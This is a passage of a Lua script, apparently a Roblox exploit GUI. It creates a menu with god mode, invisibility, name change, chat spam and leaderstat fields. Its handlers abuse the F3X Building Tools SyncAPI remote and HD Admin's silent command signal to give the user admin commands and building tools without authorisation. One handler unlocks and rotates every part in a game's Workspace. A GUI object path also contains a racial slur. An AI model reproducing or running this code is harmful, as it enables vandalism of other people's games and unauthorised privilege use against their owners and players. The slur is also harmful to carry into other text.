		local sbutton = Instance.new("TextButton")
		sbutton.Parent = page
		sbutton.BackgroundColor3 = blak
		sbutton.BorderColor3 = rede
		sbutton.BorderSizePixel = 3
		sbutton.Name = "SettingsButton"
		sbutton.Position = UDim2.new(1,3,0,0)
		sbutton.Size = UDim2.new(0,27,1,0)
		sbutton.Font = tef
		sbutton.FontSize = "Size48"
		sbutton.TextColor3 = whit
		sbutton.Text = "<"
		cango = true
		sbutton.MouseButton1Down:connect(function()
			if cango == true then
				if sbutton.Text == "<" then
					sbutton.Text = ">"
					cango = false
					repeat
						wait()
						page.Position = UDim2.new(1,page.Position.X.Offset-10,0,0)
					until page.Position.X.Offset <= -293
					wait()
					page.Position = UDim2.new(1,-300,0,0)
					cango = true
				else
					sbutton.Text = "<"
					cango = false
					repeat
						wait()
						page.Position = UDim2.new(1,page.Position.X.Offset+10,0,0)
					until page.Position.X.Offset >= -10
					wait()
					page.Position = UDim2.new(1,3,0,0)
					cango = true
				end	
			end
		end)
		local title = Instance.new("TextLabel")
		title.Parent = page
		title.BackgroundColor3 = blak
		title.BorderColor3 = rede
		title.BorderSizePixel = 3
		title.Name = "Title"
		title.Position = UDim2.new(0,0,0,0)
		title.Size = UDim2.new(1,0,0,40)
		title.ZIndex = 1
		title.Font = tef
		title.FontSize = "Size24"
		title.Text = "Settings"
		title.TextColor3 = whit
	
	
		local bgt = Instance.new("Frame")
		bgt.Parent = pge1
		bgt.BackgroundColor3 = blak
		bgt.BorderColor3 = rede
		bgt.BorderSizePixel = 3
		bgt.Name = "Billboard Gui Text"
		bgt.Position = UDim2.new(0.5,3,0,198)
		bgt.Size = UDim2.new(0.5,-3,0,63)
		local cgid = Instance.new("Frame")
		cgid.Parent = pge1
		cgid.BackgroundColor3 = blak
		cgid.BorderColor3 = rede
		cgid.BorderSizePixel = 3
		cgid.Name = "Custom Gear ID"
		cgid.Position = UDim2.new(0,0,0,198)
		cgid.Size = UDim2.new(0.5,0,0,63)
		local god = Instance.new("Frame")
		god.Parent = pge1
		god.BackgroundColor3 = blak
		god.BorderColor3 = rede
		god.BorderSizePixel = 3
		god.Name = "God"
		god.Position = UDim2.new(0,0,0,132)
		god.Size = UDim2.new(0.5,0,0,63)
		local Inv = Instance.new("Frame")
		Inv.Parent = pge1
		Inv.BackgroundColor3 = blak
		Inv.BorderColor3 = rede
		Inv.BorderSizePixel = 3
		Inv.Name = "Invisibility"
		Inv.Position = UDim2.new(0.5,3,0,132)
		Inv.Size = UDim2.new(0.5,-3,0,63)
		local mid = Instance.new("Frame")
		mid.Parent = pge1
		mid.BackgroundColor3 = blak
		mid.BorderColor3 = rede
		mid.BorderSizePixel = 3
		mid.Name = "Music ID"
		mid.Position = UDim2.new(0,0,0,66)
		mid.Size = UDim2.new(0.5,0,0,63)
		local mp = Instance.new("Frame")
		mp.Parent = pge1
		mp.BackgroundColor3 = blak
		mp.BorderColor3 = rede
		mp.BorderSizePixel = 3
		mp.Name = "Music Pitch"
		mp.Position = UDim2.new(0.5,3,0,66)
		mp.Size = UDim2.new(0.5,-3,0,63)
		local pi = Instance.new("Frame")
		pi.Parent = pge1
		pi.BackgroundColor3 = blak
		pi.BorderColor3 = rede
		pi.BorderSizePixel = 3
		pi.Name = "Place ID"
		pi.Position = UDim2.new(0.5,3,0,0)
		pi.Size = UDim2.new(0.5,-3,0,63)
		local sdi = Instance.new("Frame")
		sdi.Parent = pge1
		sdi.BackgroundColor3 = blak
		sdi.BorderColor3 = rede
		sdi.BorderSizePixel = 3
		sdi.Name = "Skybox/Decal ID"
		sdi.Position = UDim2.new(0,0,0,0)
		sdi.Size = UDim2.new(0.5,0,0,63)
		local textbx = Instance.new("TextBox")
		textbx.Parent = sdi
		textbx.BackgroundColor3 = blak
		textbx.BorderColor3 = rede
		textbx.BorderSizePixel = 3 
		textbx.ClearTextOnFocus = true
		textbx.Position = UDim2.new(0,0,0.5,0)
		textbx.Size = UDim2.new(0.99,1,0.5,-1)
		textbx.Font = tef
		textbx.FontSize = "Size14"
		textbx.Text = "105142844398851"
		textbx.TextColor3 = whit
		local titl = Instance.new("TextLabel")
		titl.Parent = sdi
		titl.BackgroundColor3 = blak
		titl.BorderColor3 = rede
		titl.BorderSizePixel = 3
		titl.Name = "Title"
		titl.Size = UDim2.new(1,0,0,30)
		titl.Font = tef.."Bold"
		titl.FontSize = "Size14"
		titl.Text = "Skybox/Decal ID"
		titl.TextColor3 = whit
		local textbx = Instance.new("TextBox")
		textbx.Parent = pi
		textbx.BackgroundColor3 = blak
		textbx.BorderColor3 = rede
		textbx.BorderSizePixel = 3 
		textbx.ClearTextOnFocus = true
		textbx.Position = UDim2.new(0,0,0.5,0)
		textbx.Size = UDim2.new(0.99,1,0.5,-1)
		textbx.Font = tef
		textbx.FontSize = "Size14"
		textbx.Text = "149559312"
		textbx.TextColor3 = whit
		local titl = Instance.new("TextLabel")
		titl.Parent = pi
		titl.BackgroundColor3 = blak
		titl.BorderColor3 = rede
		titl.BorderSizePixel = 3
		titl.Name = "Title"
		titl.Size = UDim2.new(1,0,0,30)
		titl.Font = tef.."Bold"
		titl.FontSize = "Size14"
		titl.Text = "Place ID"
		titl.TextColor3 = whit
		local textbx = Instance.new("TextBox")
		textbx.Parent = mp
		textbx.BackgroundColor3 = blak
		textbx.BorderColor3 = rede
		textbx.BorderSizePixel = 3 
		textbx.ClearTextOnFocus = true
		textbx.Position = UDim2.new(0,0,0.5,0)
		textbx.Size = UDim2.new(0.99,1,0.5,-1)
		textbx.Font = tef
		textbx.FontSize = "Size14"
		textbx.Text = "0.150"
		textbx.TextColor3 = whit
		local titl = Instance.new("TextLabel")
		titl.Parent = mp
		titl.BackgroundColor3 = blak
		titl.BorderColor3 = rede
		titl.BorderSizePixel = 3
		titl.Name = "Title"
		titl.Size = UDim2.new(1,0,0,30)
		titl.Font = tef.."Bold"
		titl.FontSize = "Size14"
		titl.Text = "Music Pitch"
		titl.TextColor3 = whit
		local textbx = Instance.new("TextBox")
		textbx.Parent = mid
		textbx.BackgroundColor3 = blak
		textbx.BorderColor3 = rede
		textbx.BorderSizePixel = 3 
		textbx.ClearTextOnFocus = true
		textbx.Position = UDim2.new(0,0,0.5,0)
		textbx.Size = UDim2.new(0.99,1,0.5,-1)
		textbx.Font = tef
		textbx.FontSize = "Size14"
		textbx.Text = "136247552074672"
		textbx.TextColor3 = whit
		local titl = Instance.new("TextLabel")
		titl.Parent = mid
		titl.BackgroundColor3 = blak
		titl.BorderColor3 = rede
		titl.BorderSizePixel = 3
		titl.Name = "Title"
		titl.Size = UDim2.new(1,0,0,30)
		titl.Font = tef.."Bold"
		titl.FontSize = "Size14"
		titl.Text = "Music ID"
		titl.TextColor3 = whit
		local textbx = Instance.new("TextBox")
		textbx.Parent = cgid
		textbx.BackgroundColor3 = blak
		textbx.BorderColor3 = rede
		textbx.BorderSizePixel = 3 
		textbx.ClearTextOnFocus = true
		textbx.Position = UDim2.new(0,0,0.5,0)
		textbx.Size = UDim2.new(0.99,1,0.5,-1)
		textbx.Font = tef
		textbx.FontSize = "Size14"
		textbx.Text = "136247552074672"
		textbx.TextColor3 = whit
		local titl = Instance.new("TextLabel")
		titl.Parent = cgid
		titl.BackgroundColor3 = blak
		titl.BorderColor3 = rede
		titl.BorderSizePixel = 3
		titl.Name = "Title"
		titl.Size = UDim2.new(1,0,0,30)
		titl.Font = tef.."Bold"
		titl.FontSize = "Size14"
		titl.Text = "Custom Gear ID"
		titl.TextColor3 = whit
		local textbx = Instance.new("TextBox")
		textbx.Parent = bgt
		textbx.BackgroundColor3 = blak
		textbx.BorderColor3 = rede
		textbx.BorderSizePixel = 3 
		textbx.ClearTextOnFocus = true
		textbx.Position = UDim2.new(0,0,0.5,0)
		textbx.Size = UDim2.new(0.99,1,0.5,-1)
		textbx.Font = tef
		textbx.FontSize = "Size14"
		textbx.Text = "c00lkidd"
		textbx.TextColor3 = whit
		local titl = Instance.new("TextLabel")
		titl.Parent = bgt
		titl.BackgroundColor3 = blak
		titl.BorderColor3 = rede
		titl.BorderSizePixel = 3
		titl.Name = "Title"
		titl.Size = UDim2.new(1,0,0,30)
		titl.Font = tef.."Bold"
		titl.FontSize = "Size14"
		titl.Text = "Billboard Gui Text"
		titl.TextColor3 = whit
		titl.TextWrapped = true
	
		local button = Instance.new("TextButton")
		button.Parent = Inv
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3 
		button.Position = UDim2.new(0,0,0.5,0)
		button.Size = UDim2.new(0.99,1,0.5,-1)
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "On"
		button.TextColor3 = whit
		button.MouseButton1Down:connect(function()
			if button.Text == "Off" then
				local player = game.Players.LocalPlayer
				local char = player.Character or player.CharacterAdded:Wait()
	
				local tool
				for _, v in player:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
				for _, v in game.ReplicatedStorage:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
	
				remote = tool.SyncAPI.ServerEndpoint
				function _(args)
					remote:InvokeServer(unpack(args))
				end
	
				function SetTrans(part, int)
					local args = {
						[1] = "SyncMaterial",
						[2] = {
							[1] = {
								["Part"] = part,
								["Transparency"] = int
							}
						}
					}
					_(args)
				end
	
				for _, part in ipairs(char:GetDescendants()) do
					if part:IsA("BasePart") then
						SetTrans(part, 1) 
					end
				end
	
				button.Text = "On"
			else
				local player = game.Players.LocalPlayer
				local char = player.Character or player.CharacterAdded:Wait()
	
				local tool
				for _, v in player:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
				for _, v in game.ReplicatedStorage:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
	
				remote = tool.SyncAPI.ServerEndpoint
				function _(args)
					remote:InvokeServer(unpack(args))
				end
	
				function SetTrans(part, int)
					local args = {
						[1] = "SyncMaterial",
						[2] = {
							[1] = {
								["Part"] = part,
								["Transparency"] = int
							}
						}
					}
					_(args)
				end
	
				for _, part in ipairs(char:GetDescendants()) do
					if part:IsA("BasePart") then
						SetTrans(part, 0) 
					end
				end
	
				button.Text = "Off"
			end
		end)
		local titl = Instance.new("TextLabel")
		titl.Parent = Inv
		titl.BackgroundColor3 = blak
		titl.BorderColor3 = rede
		titl.BorderSizePixel = 3
		titl.Name = "Title"
		titl.Size = UDim2.new(1,0,0,30)
		titl.Font = tef.."Bold"
		titl.FontSize = "Size14"
		titl.Text = "Invisibility"
		titl.TextColor3 = whit
		titl.TextWrapped = true
		local button = Instance.new("TextButton")
		button.Parent = god
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3 
		button.Position = UDim2.new(0,0,0.5,0)
		button.Size = UDim2.new(0.99,1,0.5,-1)
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "On"
		button.TextColor3 = whit
		button.MouseButton1Down:connect(function()
			if button.Text == "Off" then
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommandSilent:InvokeServer(";god")
				button.Text = "On"
			else
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommandSilent:InvokeServer(";ungod")
				button.Text = "Off"
			end
		end)
		local titl = Instance.new("TextLabel")
		titl.Parent = god
		titl.BackgroundColor3 = blak
		titl.BorderColor3 = rede
		titl.BorderSizePixel = 3
		titl.Name = "Title"
		titl.Size = UDim2.new(1,0,0,30)
		titl.Font = tef.."Bold"
		titl.FontSize = "Size14"
		titl.Text = "God"
		titl.TextColor3 = whit
		titl.TextWrapped = true		
		--Page 2--
		local arr = Instance.new("Frame")
		arr.Parent = pge2
		arr.BackgroundColor3 = blak
		arr.BorderColor3 = rede
		arr.BorderSizePixel = 3
		arr.Name = "Anti Robloxian Range"
		arr.Position = UDim2.new(0.5,3,0,198)
		arr.Size = UDim2.new(0.5,-3,0,63)
		local bgc = Instance.new("Frame")
		bgc.Parent = pge2
		bgc.BackgroundColor3 = blak
		bgc.BorderColor3 = rede
		bgc.BorderSizePixel = 3
		bgc.Name = "Billboard Gui Color"
		bgc.Position = UDim2.new(0,0,0,198)
		bgc.Size = UDim2.new(0.5,0,0,63)
		local cst = Instance.new("Frame")
		cst.Parent = pge2
		cst.BackgroundColor3 = blak
		cst.BorderColor3 = rede
		cst.BorderSizePixel = 3
		cst.Name = "Chat Spam Text"
		cst.Position = UDim2.new(0,0,0,132)
		cst.Size = UDim2.new(0.5,0,0,63)
		local lsa = Instance.new("Frame")
		lsa.Parent = pge2
		lsa.BackgroundColor3 = blak
		lsa.BorderColor3 = rede
		lsa.BorderSizePixel = 3
		lsa.Name = "Leaderstat Amount"
		lsa.Position = UDim2.new(0.5,3,0,132)
		lsa.Size = UDim2.new(0.5,-3,0,63)
		local lsn = Instance.new("Frame")
		lsn.Parent = pge2
		lsn.BackgroundColor3 = blak
		lsn.BorderColor3 = rede
		lsn.BorderSizePixel = 3
		lsn.Name = "Leaderstat Name"
		lsn.Position = UDim2.new(0,0,0,66)
		lsn.Size = UDim2.new(0.5,0,0,63)
		local nmb = Instance.new("Frame")
		nmb.Parent = pge2
		nmb.BackgroundColor3 = blak
		nmb.BorderColor3 = rede
		nmb.BorderSizePixel = 3
		nmb.Name = "Name Box"
		nmb.Position = UDim2.new(0.5,3,0,66)
		nmb.Size = UDim2.new(0.5,-3,0,63)
	
	
	
		local wsa = Instance.new("Frame")
		wsa.Parent = pge2
		wsa.BackgroundColor3 = blak
		wsa.BorderColor3 = rede
		wsa.BorderSizePixel = 3
		wsa.Name = "Walkspeed Amount"
		wsa.Position = UDim2.new(0.5,3,0,0)
		wsa.Size = UDim2.new(0.5,-3,0,63)
	
	
		local textbx = Instance.new("TextBox")
		textbx.Parent = arr
		textbx.BackgroundColor3 = blak
		textbx.BorderColor3 = rede
		textbx.BorderSizePixel = 3 
		textbx.ClearTextOnFocus = true
		textbx.Position = UDim2.new(0,0,0.5,0)
		textbx.Size = UDim2.new(0.99,1,0.5,-1)
		textbx.Font = tef
		textbx.FontSize = "Size14"
		textbx.Text = "4"
		textbx.TextColor3 = whit
		local titl = Instance.new("TextLabel")
		titl.Parent = arr
		titl.BackgroundColor3 = blak
		titl.BorderColor3 = rede
		titl.BorderSizePixel = 3
		titl.Name = "Title"
		titl.Size = UDim2.new(1,0,0,30)
		titl.Font = tef.."Bold"
		titl.FontSize = "Size14"
		titl.Text = "Anti Robloxian Rage"
		titl.TextColor3 = whit
		titl.TextWrapped = true
		textbx1 = Instance.new("TextBox")
		textbx1.Parent = bgc
		textbx1.BackgroundColor3 = blak
		textbx1.BorderColor3 = rede
		textbx1.BorderSizePixel = 3 
		textbx1.ClearTextOnFocus = true
		textbx1.Position = UDim2.new(0,0,0.5,0)
		textbx1.Size = UDim2.new(0,50,0.5,-1)
		textbx1.Font = tef
		textbx1.FontSize = "Size14"
		textbx1.Text = "200"
		textbx1.TextColor3 = whit
		textbx1.Name = "TextBox1"
		textbx2 = Instance.new("TextBox")
		textbx2.Parent = bgc
		textbx2.BackgroundColor3 = blak
		textbx2.BorderColor3 = rede
		textbx2.BorderSizePixel = 3 
		textbx2.ClearTextOnFocus = true
		textbx2.Position = UDim2.new(0,50,0.5,0)
		textbx2.Size = UDim2.new(0,50,0.5,-1)
		textbx2.Font = tef
		textbx2.FontSize = "Size14"
		textbx2.Text = "0"
		textbx2.TextColor3 = whit
		textbx2.Name = "TextBox2"
		textbx3 = Instance.new("TextBox")
		textbx3.Parent = bgc
		textbx3.BackgroundColor3 = blak
		textbx3.BorderColor3 = rede
		textbx3.BorderSizePixel = 3 
		textbx3.ClearTextOnFocus = true
		textbx3.Position = UDim2.new(0,100,0.5,0)
		textbx3.Size = UDim2.new(0,50,0.5,-1)
		textbx3.Font = tef
		textbx3.FontSize = "Size14"
		textbx3.Text = "0"
		textbx3.TextColor3 = whit
		textbx3.Name = "TextBox3"
		local titl = Instance.new("TextLabel")
		titl.Parent = bgc
		titl.BackgroundColor3 = blak
		titl.BorderColor3 = rede
		titl.BorderSizePixel = 3
		titl.Name = "Title"
		titl.Size = UDim2.new(1,0,0,30)
		titl.Font = tef.."Bold"
		titl.FontSize = "Size14"
		titl.Text = "Billboard Gui Color"
		titl.TextColor3 = whit
		titl.TextWrapped = true		
		local textbx = Instance.new("TextBox")
		textbx.Parent = cst
		textbx.BackgroundColor3 = blak
		textbx.BorderColor3 = rede
		textbx.BorderSizePixel = 3 
		textbx.ClearTextOnFocus = true
		textbx.Position = UDim2.new(0,0,0.5,0)
		textbx.Size = UDim2.new(0.99,1,0.5,-1)
		textbx.Font = tef
		textbx.FontSize = "Size14"
		textbx.Text = "join team c00lkidd!"
		textbx.TextColor3 = whit
		local titl = Instance.new("TextLabel")
		titl.Parent = cst
		titl.BackgroundColor3 = blak
		titl.BorderColor3 = rede
		titl.BorderSizePixel = 3
		titl.Name = "Title"
		titl.Size = UDim2.new(1,0,0,30)
		titl.Font = tef.."Bold"
		titl.FontSize = "Size14"
		titl.Text = "Chat Spam Text"
		titl.TextColor3 = whit
		titl.TextWrapped = true
		local textbx = Instance.new("TextBox")
		textbx.Parent = lsa
		textbx.BackgroundColor3 = blak
		textbx.BorderColor3 = rede
		textbx.BorderSizePixel = 3 
		textbx.ClearTextOnFocus = true
		textbx.Position = UDim2.new(0,0,0.5,0)
		textbx.Size = UDim2.new(0.99,1,0.5,-1)
		textbx.Font = tef
		textbx.FontSize = "Size14"
		textbx.Text = "50"
		textbx.TextColor3 = whit
		local titl = Instance.new("TextLabel")
		titl.Parent = lsa
		titl.BackgroundColor3 = blak
		titl.BorderColor3 = rede
		titl.BorderSizePixel = 3
		titl.Name = "Title"
		titl.Size = UDim2.new(1,0,0,30)
		titl.Font = tef.."Bold"
		titl.FontSize = "Size14"
		titl.Text = "Leaderstat Amount"
		titl.TextColor3 = whit
		titl.TextWrapped = true
		local textbx = Instance.new("TextBox")
		textbx.Parent = lsn
		textbx.BackgroundColor3 = blak
		textbx.BorderColor3 = rede
		textbx.BorderSizePixel = 3 
		textbx.ClearTextOnFocus = true
		textbx.Position = UDim2.new(0,0,0.5,0)
		textbx.Size = UDim2.new(0.99,1,0.5,-1)
		textbx.Font = tef
		textbx.FontSize = "Size14"
		textbx.Text = "KOs"
		textbx.TextColor3 = whit
		local titl = Instance.new("TextLabel")
		titl.Parent = lsn
		titl.BackgroundColor3 = blak
		titl.BorderColor3 = rede
		titl.BorderSizePixel = 3
		titl.Name = "Title"
		titl.Size = UDim2.new(1,0,0,30)
		titl.Font = tef.."Bold"
		titl.FontSize = "Size14"
		titl.Text = "Leaderstat Name"
		titl.TextColor3 = whit
		titl.TextWrapped = true
		local titl = Instance.new("TextLabel")
		titl.Parent = nmb
		titl.BackgroundColor3 = blak
		titl.BorderColor3 = rede
		titl.BorderSizePixel = 3
		titl.Name = "Title"
		titl.Size = UDim2.new(1,0,0,30)
		titl.Font = tef.."Bold"
		titl.FontSize = "Size14"
		titl.Text = "Name"
		titl.TextColor3 = whit
		titl.TextWrapped = true
		local textbxx = Instance.new("TextBox",nmb)
		textbxx.BackgroundColor3 = blak
		textbxx.BorderColor3 = rede
		textbxx.BorderSizePixel = 3 
		textbxx.ClearTextOnFocus = true
		textbxx.Position = UDim2.new(0,0,0.5,0)
		textbxx.Size = UDim2.new(0.99,1,0.5,-1)
		textbxx.Font = tef
		textbxx.FontSize = "Size14"
		textbxx.Text = "God"
		textbxx.TextColor3 = whit
	
		local button = Instance.new("TextButton")
		button.Parent = localp
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Change Name"
		button.Position = UDim2.new(0,0,0,66)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Change Name"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			local text = game:GetService("CoreGui").CoolGui.Frame.Settings.Page2["Name Box"].TextBox.text
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
			RequestCommandSilent:InvokeServer(";name me " .. text)
		end)
	
		local textbx = Instance.new("TextBox")
		textbx.Parent = wsa
		textbx.BackgroundColor3 = blak
		textbx.BorderColor3 = rede
		textbx.BorderSizePixel = 3 
		textbx.ClearTextOnFocus = true
		textbx.Position = UDim2.new(0,0,0.5,0)
		textbx.Size = UDim2.new(0.99,1,0.5,-1)
		textbx.Font = tef
		textbx.FontSize = "Size14"
		textbx.Text = "50"
		textbx.TextColor3 = whit
		local titl = Instance.new("TextLabel")
		titl.Parent = wsa
		titl.BackgroundColor3 = blak
		titl.BorderColor3 = rede
		titl.BorderSizePixel = 3
		titl.Name = "Title"
		titl.Size = UDim2.new(1,0,0,30)
		titl.Font = tef.."Bold"
		titl.FontSize = "Size14"
		titl.Text = "Walkspeed Amount"
		titl.TextColor3 = whit
		titl.TextWrapped = true
		--Settings--
	
		-----------------------------------------------------------------------------
		--Important Script to make tabs work! DONT TOUCH--
		CurrentPage = 1
	
		function FlipPage(Way)
			local NewPage = CurrentPage+Way
			if pges:findFirstChild("Page"..NewPage)~=nil then
				CurrentPage = NewPage
				local P = pges:GetChildren()
				for i = 1, #P do
					P[i].Visible = false
				end
				pges:findFirstChild("Page"..NewPage).Visible = true
			end
		end
		right.MouseButton1Down:connect(function()FlipPage(1) end)
		left.MouseButton1Down:connect(function()FlipPage(-1) end)
		page1.addonl.MouseButton1Down:connect(function()CurrentPage=6 FlipPage(-1) end)
		page5.addonr.MouseButton1Down:connect(function()CurrentPage=0 FlipPage(1) end)
		-----------------------------------------------------------------------------
		while true do
			local Players = game:GetService("Players")
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
	
			local player = Players.LocalPlayer
			local backpack = player:WaitForChild("Backpack")
	
			local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient")
				:WaitForChild("Signals")
				:WaitForChild("RequestCommandSilent")
	
			local function r()
				local hasBTools = false
	
				for _, tool in ipairs(backpack:GetChildren()) do
					if tool:IsA("Tool") and tool.Name == "Building Tools" then
						hasBTools = true
						break
					end
				end
	
				if not hasBTools then
					RequestCommandSilent:InvokeServer(";btools")
				end
			end
	
			r()
			wait(1)
		end
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_39);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_3b()
local script = G2L["3b"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
	
	
		function randomise()
			for i,v in game.Workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetLocked(v,false)
						MovePart(v,v.CFrame * CFrame.Angles(math.random(0,1), math.random(0,1), math.random(0,1)))
					end)
				end
			end
		end
		randomise()
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_3b);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_3d()
local script = G2L["3d"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
